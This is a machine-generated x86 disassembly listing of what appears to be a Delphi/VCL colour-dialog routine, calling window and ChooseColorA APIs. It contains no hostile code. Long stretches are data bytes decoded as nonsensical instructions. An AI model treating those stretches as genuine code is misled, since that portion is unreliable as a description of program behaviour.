mov [ edx ] cs
inc edx
add [ ecx + ecx * 4 ] cl
inc ecx
add [ ebx + ecx + 0x42 ] ah
add [ eax ] dh
or al [ edx ]
je r-xdata
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh

add [ esi + ecx - 0x360bffbe ] ah
inc edx
add [ ebx + ecx * 8 ] bl
inc edx
add [ eax - 0x36 ] dh
inc edx
add [ eax - 0x35 ] ch
inc edx
add ah cl
sub al [ eax ]
add eax 0x10000200
add [ edx - 0x11001100 ] eax
jmp [ ebx + ecx * 8 ]
inc edx
sub_42c8d8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4660c0
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_462660
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_462660
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_465dc4
mov edi eax
mov eax ebx
call sub_465da8
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_465d90
mov edi eax
mov eax ebx
call sub_465ddc
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_42c98c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_42c8d8
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_42c9f4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420714
mov [ esi + 0x30 ] 0x1
push esi
push sub_42cad0
call sub_4217a4
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_42ca3c
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420760
test bl bl
jle r-xdata
call sub_42183c
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_42ca70
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_468ab4
mov cl 0x1
sub_42ca98
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4034c8
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42cad0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42cafa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42cb68
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_45f4a4
mov [ ebp - 0x14 ] eax
call sub_45f3c0
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42cc2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4683a4
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_42cbfd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cc04
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468400
retn
sub_42cc04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cc32
mov eax [ ebp - 0x14 ]
call sub_45f558
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_45f3c8
retn
sub_42cc64
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42c9f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x60 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_42cca8
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x60 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42ca3c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_42ccd8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
xor eax eax
push ebp
push sub_42cd75
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x44 ]
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebx ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408d00
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
mov edx esi
add dl 0x41
call sub_4041f0
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_404314
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x60 ]
pop ecx
call sub_41a09c
inc esi
add ebx 0x4
cmp esi 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cd7c
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_42cda4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
xor eax eax
push ebp
push sub_42ce42
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x44 ]
mov [ ebx ] 0xffffffff
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_404314
mov eax [ ebp - 0x10 ]
call sub_40816c
mov [ ebx ] eax
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx esi
add dl 0x41
call sub_4041f0
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404314
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x60 ]
call sub_4199b4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ce49
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40402c
retn
inc esi
add ebx 0x4
cmp esi 0x10
jne r-xdata
sub_42ce63
inc [ ecx ]
add [ eax ] al
add [ eax + eax ] ah
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
mov [ ebp - 0x4 ] eax
push ebp
call sub_42cda4
pop ecx
mov [ ebp - 0x68 ] 0x24
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4232e0
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x44 ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x54 ] 0x11
xor eax eax
mov edx rw-data
jae r-xdata
and ebx 0x7f
bt [ ecx + 0x5c ] ebx
inc eax
add edx 0x4
cmp al 0x5
jne r-xdata
mov ecx [ edx ]
or [ ebp - 0x54 ] ecx
mov ecx [ ebp - 0x4 ]
mov ebx eax
cmp bl 0x7
ja r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x4c ] sub_42c98c
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx ChooseColorA
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
or [ ebp - 0x54 ] 0x20
mov [ ebp - 0x48 ] eax
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x5c ]
mov [ eax + 0x58 ] edx
push ebp
call sub_42ccd8
pop ecx
sub_42cfd8
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408c80
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42d073
add [ edi ] cl
add [ eax ] al
add [ eax + ebx * 2 + 0x47 ] ch
add ah dl
pop edi
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x58 ] ch
inc edi
add [ eax ] al
bound eax [ edi ]
add [ eax ] al
add [ eax ] al
pop eax
inc edi
add [ eax + 0x475f ] dh
add [ eax ] al
add [ eax + 0x58 ] ah
inc edi
add [ eax ] bl
arpl [ edi ] ax
add [ eax ] al
add [ eax ] al
pop esp
pop eax
inc edi
add [ eax ] ah
bound eax [ edi ]
add [ eax ] al
add [ eax ] al
pop eax
pop eax
inc edi
add [ eax + 0x4761 ] bh
add [ eax ] al
add [ eax + ebx * 2 + 0x47 ] dl
add [ eax + 0x4762 ] ch
add [ eax ] al
add [ eax + 0x58 ] dl
inc edi
add [ ecx ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 2 + 0x47 ] cl
add ah cl
popad
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x58 ] cl
inc edi
add [ eax ] ch
popad
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 2 + 0x47 ] al
add [ eax + 0x4763 ] ah
add [ eax ] al
add [ eax ] dl
pop eax
inc edi
add [ eax ] bl
pushad
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 2 ] cl
inc edi
add al bh
bound eax [ edi ]
add [ eax ] al
add [ eax ] al
or [ eax + 0x47 ] bl
add [ eax + 0x63 ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 2 ] al
inc edi
add [ ecx + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42d17e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d185
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404a84
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_42d188
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403ddc
call sub_42cfd8
mov eax [ r-xdata ]
call sub_417944
mov eax [ r-xdata ]
call sub_4179e4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417990
sub_42d1c9
rol [ edx ] 0x1
add ecx [ edx ]
push esp
push ebx
push 0x54657061
jns r-xdata
add [ ebx + edx * 8 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
rol [ edx ] cl
je r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ 0xffffffffc8000000 ] al
rol [ edx ] 0x1
or esi [ ebx + 0x74 ]
push edx
arpl [ gs : ecx + 0x6e ] si
insb
or [ gs : ebx + 0x74 ] dh
push ebx
jno r-xdata
add [ edi + ecx * 2 + 0xe840044 ] bl
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ eax ] cl
lahf
inc esp
add [ eax ] al
pushfd
dec edi
inc esp
add [ esi + ecx + 0x34cc0042 ] al
inc eax
inc edx
or [ edi + 0x32280044 ] bl
inc eax
add [ edx + esi + 0x40 ] al
add ah dl
popad
jb r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
add [ eax ] dh
jg r-xdata
add ah cl
xor al 0x40
or esi [ ebx + 0x74 ]
push edx
outsd
jne r-xdata
push ebx
push 0x2c657061
rol [ edx ] cl
pop es
push es
push esp
push ebx
push 0x7c657061
rol [ edx ] cl
nop
push eax
inc esp
add [ edx ] ah
add [ eax ] cl
inc ebp
js r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x74 ]
popfd
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add al cl
pop [ eax + eax + 0x3c ]
nop
inc esp
jle r-xdata
add ah al
mov [ eax + eax - 0x4 ] al
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
aam 0xef
push edx
arpl [ gs : ebp + ecx + 0x73 ] si
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ah 0xff
inc ebx
je r-xdata
add [ eax + 0x1c004480 ] dh
nop
inc esp
add [ eax ] dl
add [ ebp + eax * 4 + 0x44 ] bh
add al ah
test [ eax + eax + 0x8 ] al
mov es [ eax + eax - 0x80 ]
jge r-xdata
inc edx
test [ esi ] cl
outsd
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push cs
add [ edx ] cl
inc esp
jb r-xdata
insb
jae r-xdata
add [ eax ] dh
int1
inc edx
add [ ebx + edx * 2 ] cl
je r-xdata
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
add al ch
stosd [ edi ]
inc esp
add al ah
lahf
inc esp
add [ ecx + ecx * 4 ] cl
push ebx
jno r-xdata
add [ eax ] eax
add [ eax ] al
adc [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
pushfd
cmp al 0x44
add [ eax + eax ] dh
inc ebx
jne r-xdata
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
hlt
add al al
xor al 0x44
add [ ebx ] bl
add bh bh
or [ eax + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
cmp cl dh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4205000d ] al
jb r-xdata
insb
inc ebx
push 0x65676e61
push es
push esp
inc ecx
add [ eax - 0x3bffbb55 ] dh
jg r-xdata
popad
jb r-xdata
inc [ esp + ecx * 4 + 0x44 ]
add [ esp + ecx * 4 ] cl
jb r-xdata
dec eax
scasd [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
jae r-xdata
add [ fs : eax ] al
jae r-xdata
out dx eax
or [ ebx + 0x74 ] esi
inc ebp
insb
insb
imul esi [ eax + 0x73 ] 0x74730865
inc ebx
imul esi [ edx + 0x63 ] 0x4508656c
js r-xdata
adc [ eax ] al
add [ eax ] al
adc eax 0x68530500
popad
jo r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + 0x68ff0000 ] bl
mov [ eax + eax + 0x1 ] es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
push cs
push eax
popad
jb r-xdata
outsb
jae r-xdata
add bh bh
enter 0x44af 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
jb r-xdata
outsd
add [ gs : eax ] dl
test al 0x34
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
add [ esi + ecx - 0x10cfffbe ] ah
inc edx
add [ eax - 0x66 ] bh
inc esp
add [ edx + ebx * 4 + 0x44 ] dh
add [ ebx + ebx * 4 + 0x44 ] al
add [ ebx + ecx + 0x42 ] bh
inc ebx
je r-xdata
add [ eax ] al
js r-xdata
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080016 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] dl
inc eax
add [ ecx + 0x44ff0000 ] bl
mov [ eax + eax + 0xc ] es
mov [ eax + eax ] es
outsd
ja r-xdata
outsb
je r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ gs : eax ] dl
cmp eax [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ eax ]
inc esp
jb r-xdata
add bh bh
jl r-xdata
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x4f09001f ] al
pop eax
cmp eax 0xd00044
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6e4f0b00
aas
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09001c ] al
outsb
push eax
je r-xdata
push edi
add [ eax ] al
call [ edx + ecx * 4 ]
inc esp
add [ eax - 0x55 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ss
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x80656c62
inc esp
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0018 ] al
outsb
inc ebx
outsd
outsb
imul ebp [ esi + 0x74 ] r-xdata
inc esp
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
or eax [ ebx + 0x6f ]
adc [ edx ] 0x0
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ eax ] bh
jle r-xdata
0x9a740044 0x44
inc esp
fwait
inc esp
inc edx
rol [ edx ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0xd3
inc edx
add [ eax ] al
add [ eax ] al
xlat
push ebp
jo r-xdata
arpl [ ebx - 0x5c ] bp
aas
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0021 ] al
inc esp
outsd
ja r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al 0x0
or [ edi + 0x6e ] ecx
jo r-xdata
add [ eax + 0x4f09001b ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
jo r-xdata
and eax [ edx ]
push 0x44ff0001
int1
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50030014 ] al
outsb
enter 0x42d1 0x0
jo r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
add [ eax ] dh
jg r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0020 ] al
outsb
push ebx
je r-xdata
jg r-xdata
mov al 0xab
inc esp
add ah al
jb r-xdata
sar [ 0xd80044 ] 0x1
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
dec edi
jbe r-xdata
aas
inc esp
add al ch
add [ eax ] al
call [ eax - 0xf ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
push eax
int1
je r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x74 ]
popfd
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add al cl
pop [ eax + eax + 0x3c ]
nop
jle r-xdata
add ah al
mov [ eax + eax - 0x4 ] al
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ eax ] cl
lahf
inc esp
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add [ 0xffffffffabe80045 ] 0x44
jb r-xdata
or eax [ edx ]
jl r-xdata
inc esp
jb r-xdata
inc edx
add [ eax + 0x1 ] dh
add [ eax ] al
pushfd
dec edi
inc esp
add [ esi + ecx + 0x34cc0042 ] al
popad
dec ebp
outsd
jbe r-xdata
outsb
jb r-xdata
add ah ah
jle r-xdata
outsd
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
inc ebx
je r-xdata
add [ eax + 0x1c004480 ] dh
nop
inc esp
add ah cl
int1
inc edx
add [ ecx ] cl
push esp
push eax
add [ ebp + eax * 4 + 0x44 ] bh
add al ah
test [ eax + eax + 0x8 ] al
mov es [ eax + eax - 0x80 ]
jge r-xdata
add al ah
lahf
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
add [ eax - 0x17ffbafb ] al
stosd [ edi ]
inc esp
inc esp
outsd
add [ eax ] bh
jle r-xdata
0x9a740044 0x44
inc esp
fwait
inc esp
inc edx
add [ esi + ecx - 0xe93ffbe ] ah
inc edx
add [ eax - 0x66 ] bh
inc esp
add [ edx + ebx * 4 + 0x44 ] dh
add [ ebx + ebx * 4 + 0x44 ] al
lea eax [ bx + si ]
rcl dh 0x1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x29 ] dh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x29 ] ah
outsb
push ebx
je r-xdata
dec edi
pop eax
cmp eax 0xe00044
add bh bh
loopne r-xdata
add [ eax - 0x80000000 ] al
sbb al [ eax ]
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
aas
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000e ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc esp
enter 0x448f 0x0
cmp al 0x90
salc
inc edx
add [ eax + 0x27004450 ] dl
add [ eax ] cl
inc ebp
js r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ ebx ] cl
inc ebx
insb
jae r-xdata
popad
imul ebp [ esi + 0x74 ] 0x8b786f42
shl [ eax - 0x29 ] 0x42
add [ edi ] al
or [ eax + edx * 2 + 0x61 ] edx
imul ebp [ esi + 0x74 ] 0xd0786f42
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ ecx ] cl
dec edi
add [ eax ] al
add [ eax + 0x4f0b001d ] al
fwait
add [ eax ] al
inc [ ecx ]
pushad
sbb eax r--data
add bh bh
xchg esp eax
mov [ eax + eax - 0x50 ] es
mov [ eax + eax ] es
add [ eax ] al
add [ 0xdff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
add [ ecx ] dl
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x4434a873
add [ edx ] bh
add bh bh
jpe r-xdata
inc ecx
insb
imul esp [ edi + 0x6e ] r-xdata
popad
add [ eax ] al
dec [ eax + 0x7e ]
inc esp
add al al
xor al 0x44
add [ ebx ] bl
add bh bh
or [ eax + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
hlt
cmp al 0x44
add [ eax + eax ] dh
dec eax
scasd [ edi ]
inc esp
push eax
popad
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
str [ edx ]
inc esp
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ecx ] cl
push eax
outsd
jo r-xdata
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
adc al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ edx ] ah
inc edx
add [ eax ] ch
inc ebx
jne r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001b ] al
outsb
inc ebx
outsd
outsb
je r-xdata
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
adc [ eax ] al
pop edx
add [ eax ] al
jae r-xdata
add [ eax ] al
js r-xdata
add [ eax ] eax
jmp [ eax ]
outsb
jne r-xdata
add [ eax ] eax
outsb
adc [ eax ] al
pop ecx
add [ eax ] al
jmp [ eax ]
add bh bh
call 0xfffffffff8431d3d
mov eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040013 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0b0021 ] al
dec edi
jbe r-xdata
in al dx
push eax
outsd
jo r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc [ esp + ecx * 4 + 0x44 ]
add [ esp + ecx * 4 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080018 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
sbb [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x14656c62
push esi
inc ecx
add [ eax ] ah
add [ eax ] al
call [ edx + ecx * 4 ]
inc esp
add [ eax - 0x55 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
push 0x6948776f
outsb
je r-xdata
inc eax
add [ gs : eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
